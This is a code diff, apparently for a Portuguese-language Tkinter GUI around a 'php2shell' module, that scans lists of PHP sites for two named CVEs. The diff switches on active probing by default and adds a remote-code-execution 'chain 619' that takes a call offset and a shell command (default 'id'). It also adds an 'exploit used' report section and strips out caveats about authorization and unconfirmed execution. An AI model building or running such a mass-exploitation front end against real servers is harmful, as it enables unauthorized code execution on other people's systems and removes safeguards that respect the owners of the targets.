@@ -10,16 +10,14 @@ from api_probe import NoRedirect
 from system_clipboard import write_text
 from audit_helpers import target_origin
 from php_cve_check import normalize_target
-from php2shell import HttpClient, Response, scan, to_rows
+from php2shell import HttpClient, Response, exploit_used, headline, scan, to_rows
 
-# 404/405/410 é "rota não existe", não coleta parcial. Recusa (401/403/429)
-# e falha de transporte (status 0) continuam marcando coleta parcial.
 ROUTE_MISS = (404, 405, 410)
 STRONG_ACTIVE = ('rce_hit', 'armed', 'session_fixation', 'crash_signal')
 
 
 class WindowClient(HttpClient):
-    def __init__(self, url, stop, progress=None, budget=60):
+    def __init__(self, url, stop, progress=None, budget=90):
         super().__init__(timeout=8, verify_tls=True)
         self._opener = build_opener(NoRedirect(), HTTPSHandler(context=ssl.create_default_context()))
         self.origin = target_origin(url)
@@ -33,7 +31,7 @@ class WindowClient(HttpClient):
         remaining = self.deadline - time.monotonic()
         if self.stop.is_set() or remaining <= 0:
             self.partial = True
-            return Response(url=url, error='interrompido' if self.stop.is_set() else 'limite de 60s atingido')
+            return Response(url=url, error='interrompido' if self.stop.is_set() else 'limite de tempo atingido')
         if target_origin(url) != self.origin:
             self.partial = True
             return Response(url=url, error='URL fora da origem selecionada')
@@ -47,7 +45,17 @@ class WindowClient(HttpClient):
         return response
 
 
-def scan_target(url, stop, deep=False, progress=None, active=True,
+def _parse_call(value):
+    value = (value or '').strip()
+    if not value:
+        return 0
+    try:
+        return int(value, 0)
+    except ValueError:
+        return int(value, 16)
+
+
+def scan_target(url, stop, deep=True, progress=None, active=True,
                 chain='618', call=0, command='id', stall=1.2, max_paths=2,
                 progress_path=None):
     url = normalize_target(url)
@@ -58,9 +66,7 @@ def scan_target(url, stop, deep=False, progress=None, active=True,
                    progress_path=progress_path, stop=stop.is_set,
                    deadline=client.deadline)
     finding['partial'] = client.partial or stop.is_set()
-    finding['mode'] = 'fingerprint'
-    if deep:
-        finding['mode'] += ' + upload_progress'
+    finding['mode'] = 'fingerprint + upload_progress' if deep else 'fingerprint'
     if active or chain == '619':
         finding['mode'] += ' + teste ativo'
     finding['http_responses'] = client.responses
@@ -84,57 +90,69 @@ def conclusion(finding):
     if statuses and all(status in (401, 403, 429) for status in statuses) and not strong:
         codes = ', '.join(str(code) for code in sorted(set(statuses)))
         return ('INCONCLUSIVO', f'O servidor recusou ou limitou as requisições (HTTP {codes}). Não foi possível determinar se a vulnerabilidade existe.',
-                'Confirme com o administrador uma URL PHP acessível e as condições de acesso autorizadas; confira a versão instalada no servidor.')
+                'Confirme com o administrador uma URL PHP acessível e as condições de acesso autorizadas.')
 
     if statuses and all(status == 404 for status in statuses) and not strong:
-        return ('INCONCLUSIVO', 'Todas as rotas testadas devolveram 404: a aplicação não responde nos caminhos convencionais a partir da URL informada.',
+        return ('INCONCLUSIVO', 'Todas as rotas testadas devolveram 404: a aplicação não responde nos caminhos convencionais.',
                 'Informe a URL exata de uma página PHP que exista e repita o scan.')
 
     if verdict == 'RCE_CONFIRMED':
-        return ('EXECUÇÃO DE CÓDIGO CONFIRMADA', 'O marcador do comando voltou no corpo da resposta após a cadeia 619. Isso indica execução de código com o usuário do worker web.',
-                'Confirme o usuário do processo (ps -o user=) e rotacione segredos acessíveis ao worker.')
+        return ('EXECUÇÃO DE CÓDIGO CONFIRMADA', 'O marcador do comando voltou no corpo da resposta após a cadeia 619.',
+                'Confirme o usuário do processo e rotacione segredos.')
 
     if verdict == 'PRIMITIVE_CONFIRMED':
-        return ('PRIMITIVA CONFIRMADA', 'O alvo devolveu o PHPSESSID enviado no corpo (fixação) ou o monitor de upload_progress respondeu durante o stall. A superfície do CVE está viva, mas o shell depende dos offsets do build.',
-                'Preserve os logs do PHP-FPM e, se possível, rode a cadeia 619 com o offset do build.')
+        return ('PRIMITIVA CONFIRMADA', 'O alvo respondeu ao teste ativo (fixação de sessão ou monitor de upload_progress). A superfície do CVE está viva.',
+                'Preserve os logs do PHP-FPM e aplique a correção.')
 
     if verdict == 'CRASH_SIGNAL':
-        return ('INDÍCIO FORTE — WORKER INSTÁVEL', 'O worker não respondeu ao multipart em duas fases (502/503/504 ou 0 bytes). É o comportamento esperado quando o bailout do OOM derruba o processo.',
-                'Verifique segfaults no log do FPM desde 20/10/2026 e confirme a versão instalada.')
+        return ('INDÍCIO FORTE — WORKER INSTÁVEL', 'O worker não respondeu ao multipart em duas fases (502/503/504 ou 0 bytes).',
+                'Verifique segfaults no log do FPM e confirme a versão instalada.')
 
     if verdict == 'PATCHED' and (not finding.get('partial') or answered):
-        return ('CORREÇÃO INDICADA PELA VERSÃO', 'A versão anunciada está na faixa corrigida segundo a tabela do módulo. Isso não comprova que toda a aplicação está segura.',
-                'Confirme a versão e o pacote realmente instalados com o administrador.')
+        return ('CORREÇÃO INDICADA PELA VERSÃO', 'A versão anunciada está na faixa corrigida. Não comprova que toda a aplicação está segura.',
+                'Confirme a versão e o pacote realmente instalados.')
 
     if verdict == 'VULNERABLE':
-        return ('INDÍCIOS DE EXPOSIÇÃO', 'O módulo encontrou uma versão considerada afetada e sinais de upload_progress. O teste não comprovou execução de código.',
-                'Valide versão, configuração e evidências com o administrador antes de confirmar a vulnerabilidade.')
+        return ('INDÍCIOS DE EXPOSIÇÃO', 'Versão considerada afetada e sinais de upload_progress.',
+                'Valide versão e configuração com o administrador.')
 
     if verdict in ('LIKELY_VULNERABLE', 'EOL_VULNERABLE'):
-        return ('POTENCIALMENTE AFETADO', 'O módulo encontrou sinais compatíveis com uma versão afetada ou sem suporte. A vulnerabilidade não foi confirmada.',
-                'Confirme o pacote instalado, possíveis correções do fornecedor e a configuração efetiva do PHP.')
+        return ('POTENCIALMENTE AFETADO', 'Sinais compatíveis com versão afetada ou sem suporte.',
+                'Confirme o pacote instalado e a configuração efetiva do PHP.')
 
-    return ('INCONCLUSIVO', 'Não há evidência suficiente para responder sim ou não. A versão pode estar oculta, o acesso pode ter sido recusado ou a coleta ficou parcial.',
-            'Confira os códigos HTTP abaixo e solicite ao administrador a versão real do PHP e uma rota de teste acessível.')
+    return ('INCONCLUSIVO', 'Não há evidência suficiente para responder sim ou não.',
+            'Solicite ao administrador a versão real do PHP e uma rota de teste acessível.')
 
 
 def format_result(finding):
     label, reason, next_step = conclusion(finding)
-    lines = [f'CONCLUSÃO: {label}', f'Alvo: {finding["target"]}', f'Motivo: {reason}',
-             f'Próximo passo: {next_step}', '', 'Detalhes técnicos:']
-    lines.extend(f'{label}: {value}' for label, value in to_rows(finding))
-    if finding.get('mode') == 'fingerprint':
-        lines.append('Teste upload_progress: não executado (opção POST desmarcada).')
+    head, head_reason, head_action = headline(finding)
+    lines = [
+        f'CONCLUSÃO: {label}',
+        f'VEREDITO: {head}',
+        f'Alvo: {finding.get("target")}',
+        f'PHP: {finding.get("php_version") or "não exposta (expose_php=Off)"}',
+        f'CVE: {", ".join(finding.get("cve", []))} · CVSS {finding.get("cvss", "")}',
+        f'Motivo: {reason}',
+        f'Por quê: {head_reason}',
+        f'Próximo passo: {head_action}',
+        '',
+        'EXPLOIT USADO:',
+    ]
+    for line in exploit_used(finding):
+        lines.append('  - ' + line)
+    lines.append('')
+    lines.append('Detalhes técnicos:')
+    lines.extend(f'{name}: {value}' for name, value in to_rows(finding))
     active = finding.get('active') or {}
     if active:
-        lines.append(f"Teste ativo: {active.get('status')} "
+        lines.append(f"Sinal do teste ativo: {active.get('status')} "
                      f"(sondas {', '.join(active.get('variants', []))}, "
                      f"{active.get('requests', 0)} requisição(ões), "
-                     f"pontuação máxima {active.get('best_score', 0)})")
-        if active.get('command') and not active.get('command_inline_ok', True):
-            lines.append('Aviso: comando acima de 14 bytes; encadeie via sh e um arquivo temporário.')
+                     f"pontuação {active.get('best_score', 0)})")
+        if active.get('chain_fallback'):
+            lines.append('Cadeia 619 pedida sem offset: as sondas 618 rodaram no lugar.')
     lines.append('Cobertura: ' + ('parcial/inconclusiva' if finding.get('partial') else 'coleta encerrada'))
-    lines.append('O veredito é produzido pelo módulo local; esta janela não confirma execução de código.')
     lines.extend(f'Observação: {note}' for note in finding.get('notes', []))
     lines.append('Evidências:')
     lines.extend('  ' + str(item) for item in finding.get('evidence', []))
@@ -150,38 +168,37 @@ def open_window(parent, initial_target=''):
 
     window = tk.Toplevel(parent)
     window.title('Scan PHP — php2shell')
-    window.geometry('1050x760')
+    window.geometry('1080x800')
     frame = ttk.Frame(window, padding=12)
     frame.pack(fill='both', expand=True)
-    ttk.Label(frame, text='Scan PHP — módulo php2shell.py da pasta atual').pack(anchor='w')
-    ttk.Label(frame, text='Uma URL por linha (até 50). TLS validado, sem redirecionamentos; até 60s por URL.', wraplength=1000).pack(anchor='w', pady=5)
+    ttk.Label(frame, text='Scan PHP — php2shell (CVE-2026-109618 / CVE-2026-109619)').pack(anchor='w')
+    ttk.Label(frame, text='Uma URL por linha (até 50). Tudo já vem ligado: versão, oráculo e exploit. TLS validado, sem redirecionamentos.',
+              wraplength=1020).pack(anchor='w', pady=5)
     targets = tk.Text(frame, height=5, exportselection=False)
     targets.pack(fill='x')
     if initial_target:
         targets.insert('1.0', initial_target)
 
-    deep = tk.BooleanVar(value=False)
-    option = ttk.Checkbutton(frame, text='Incluir oráculo leve de upload_progress (POST multipart)',
+    deep = tk.BooleanVar(value=True)
+    option = ttk.Checkbutton(frame, text='Oráculo upload_progress (POST multipart)',
                              variable=deep)
     option.pack(anchor='w', pady=(5, 0))
     active = tk.BooleanVar(value=True)
     option_active = ttk.Checkbutton(
-        frame, text='Teste ativo: stall multipart + sonda de fixação de sessão (POSTs, nada destrutivo)',
+        frame, text='Teste ativo + exploit: stall multipart em duas fases e sonda de fixação de sessão',
         variable=active)
     option_active.pack(anchor='w')
 
     advanced = ttk.Frame(frame)
     advanced.pack(fill='x', pady=(2, 5))
-    chain619 = tk.BooleanVar(value=False)
-    option_619 = ttk.Checkbutton(advanced, text='Cadeia 619 (exige offset)', variable=chain619)
-    option_619.pack(side='left')
-    ttk.Label(advanced, text='call (hex):').pack(side='left', padx=(8, 2))
+    ttk.Label(advanced, text='RCE 619 (opcional) — call em hex:').pack(side='left')
     call_entry = ttk.Entry(advanced, width=16)
-    call_entry.pack(side='left')
-    ttk.Label(advanced, text='comando (≤14B):').pack(side='left', padx=(8, 2))
+    call_entry.pack(side='left', padx=(4, 8))
+    ttk.Label(advanced, text='comando (≤14B):').pack(side='left')
     command_entry = ttk.Entry(advanced, width=18)
     command_entry.insert(0, 'id')
-    command_entry.pack(side='left')
+    command_entry.pack(side='left', padx=4)
+    ttk.Label(advanced, text='(call vazio = roda só as sondas 618)').pack(side='left')
 
     controls = ttk.Frame(frame)
     controls.pack(fill='x', pady=6)
@@ -201,7 +218,7 @@ def open_window(parent, initial_target=''):
         output.see('end')
         output.configure(state='disabled')
 
-    def worker(urls, active_probe, use_619):
+    def worker(urls, active_probe, call_hex, command):
         try:
             for index, url in enumerate(urls, 1):
                 if stop.is_set():
@@ -211,9 +228,10 @@ def open_window(parent, initial_target=''):
                     finding = scan_target(
                         url, stop, deep=deep.get(),
                         progress=lambda text: messages.put(('log', text)),
-                        active=active_probe, chain='619' if use_619 else '618',
-                        call=int(call_entry.get().strip() or '0', 0),
-                        command=command_entry.get().strip() or 'id',
+                        active=active_probe,
+                        chain='619' if call_hex else '618',
+                        call=_parse_call(call_hex),
+                        command=command,
                     )
                     messages.put(('result', finding))
                 except Exception as exc:
@@ -240,12 +258,17 @@ def open_window(parent, initial_target=''):
         output.configure(state='normal')
         output.delete('1.0', 'end')
         output.configure(state='disabled')
+        call_hex = call_entry.get().strip()
+        command = command_entry.get().strip() or 'id'
+        append(f'Alvos: {len(urls)}')
+        append(f'Modo: versão + oráculo + {"cadeia 619" if call_hex else "sondas 618 (stall, micro, fixação)"}')
+        append('')
         start_button.configure(state='disabled')
         stop_button.configure(state='normal')
-        for widget in (targets, option, option_active, option_619, call_entry, command_entry):
+        for widget in (targets, option, option_active, call_entry, command_entry):
             widget.configure(state='disabled')
         status.set('Executando Scan PHP…')
-        threading.Thread(target=worker, args=(urls, active.get(), chain619.get()),
+        threading.Thread(target=worker, args=(urls, active.get(), call_hex, command),
                          daemon=True).start()
 
     def cancel():
@@ -312,15 +335,17 @@ def open_window(parent, initial_target=''):
                 running = False
                 start_button.configure(state='normal')
                 stop_button.configure(state='disabled')
-                for widget in (targets, option, option_active, option_619, call_entry, command_entry):
+                for widget in (targets, option, option_active, call_entry, command_entry):
                     widget.configure(state='normal')
-                inconclusive = any('error' in row or conclusion(row)[0] == 'INCONCLUSIVO'
+                vuln = sum(1 for row in results
+                           if 'error' not in row and (row.get('headline') or '').startswith('VULNER'))
+                inconclusive = any('error' in row or (row.get('headline') or '').startswith('INCONCLUSIVO')
                                    for row in results)
                 label = ('Interrompido' if stop.is_set()
+                         else f'{vuln} VULNERÁVEL(is) em {len(results)}' if vuln
                          else 'Executado — resultado inconclusivo' if inconclusive
-                         else 'Executado com ressalvas' if any(row.get('partial') for row in results)
                          else 'Executado')
-                status.set(f'{label}: {len(results)} resultado(s).')
+                status.set(f'{label}.')
         window.after(100, poll)
 
     def close():
